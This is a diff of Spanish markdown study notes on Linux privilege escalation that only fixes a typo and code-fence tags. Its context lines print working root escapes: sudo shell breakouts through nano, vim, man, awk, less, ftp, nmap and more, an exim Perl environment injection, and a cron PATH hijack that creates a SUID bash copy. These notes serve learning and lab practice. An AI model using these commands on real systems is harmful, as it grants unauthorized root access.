@@ -108,7 +108,7 @@ PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
 4. La última línea **ejecuta exim con Perl embebido activado**
 
 **¿Qué se escribe en el archivo?**
-Es un pequeño código en lenguaje Pearl:
+Es un pequeño código en lenguaje Perl:
 ```Perl
 package root;
 use strict;
@@ -164,7 +164,7 @@ sudo iftop
 
 - **nano** → Nano permite leer la salida de comandos usando `Ctrl+R` > `Ctrl+X`. Si escribes `reset; sh`, ejecuta el comando `sh` (shell), como root.
 
-```
+```bash
 sudo nano
 ^R^X
 reset; sh 1>&0 2>&0
@@ -173,14 +173,14 @@ reset; sh 1>&0 2>&0
 
 - **vim** → Vim tiene un comando (`:!`) para ejecutar comandos del sistema. El `-c` permite ejecutar comandos automáticamente al iniciar. Si `vim` se ejecuta con sudo, cualquier comando lanzado con `:!` es como root.
 
-```
+```bash
 sudo vim -c ':!/bin/sh'
 ```
 
 
 - **man** → `man` usa `less` como visor de páginas. `less` permite ejecutar comandos con `!`. Por eso puedes escapar con `!sh`.
 
-```
+```bash
 sudo man man
 !/bin/sh
 ```
@@ -188,14 +188,14 @@ sudo man man
 
 - **awk** → `awk` tiene la función `system()` que puede ejecutar comandos del sistema. Si usas `sudo` con `awk`, el shell lanzado por `system()` es con privilegios root.
 
-```
+```bash
 sudo awk 'BEGIN {system("/bin/sh")}'
 ```
 
 
 - **less** → Tanto `less` como `more` (paginadores de texto) tienen funciones para ejecutar comandos externos. Al presionar `!` seguido de un comando (`sh`), lo ejecutan como root.
 
-```
+```bash
 sudo less /etc/profile
 !/bin/sh
 ```
@@ -203,7 +203,7 @@ sudo less /etc/profile
 
 -  **ftp** → El cliente `ftp` clásico tiene una opción para ejecutar comandos del sistema usando `!`. Si `ftp` está corriendo con sudo, el shell resultante es de root.
 
-```
+```bash
 sudo ftp
 !/bin/sh
 ```
@@ -211,7 +211,7 @@ sudo ftp
 
 - **nmap** → Versiones antiguas de `nmap` tienen un modo interactivo que incluye un shell embebido con soporte para ejecutar comandos externos con `!`.
 
-```
+```bash
 TF=$(mktemp)
 echo 'os.execute("/bin/sh")' > $TF
 sudo nmap --script=$TF
@@ -220,7 +220,7 @@ sudo nmap --script=$TF
 
 - **more** → Tanto `less` como `more` (paginadores de texto) tienen funciones para ejecutar comandos externos. Al presionar `!` seguido de un comando (`sh`), lo ejecutan como root.
 
-```
+```bash
 TERM= sudo more /etc/profile
 !/bin/sh
 ```
@@ -236,7 +236,7 @@ cat /etc/crontab
 ```
 
 Aparece algo como esto:
-```
+```bash
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
 # command to install the new version when you edit this file
@@ -266,7 +266,7 @@ La variable **PATH** establece el orden de búsqueda. (primero buscara en `/home
 
 ### 👉 Aprovechando overwrite.sh (creando uno propio)
 **1. Crear un archivo** `overwrite.sh` en `/home/user` con el contenido:
-```
+```bash
 #!/bin/bash 
 cp /bin/bash /tmp/cronbash 
 chmod +s /tmp/cronbash
@@ -413,7 +413,7 @@ cd /tmp/
 
 
 ## 📂NFS
->[!note] Definición:
+>[!abstract] Definición:
 >**NFS** (Network File System) es un protocolo que permite que un sistema Linux monte **directorios compartidos a través de la red**, como si fueran parte de su propio sistema de archivos.
 >
 🔹 Es decir: otro equipo (servidor NFS) comparte una carpeta, y tu máquina puede montarla y trabajar con ella como si estuviera local.
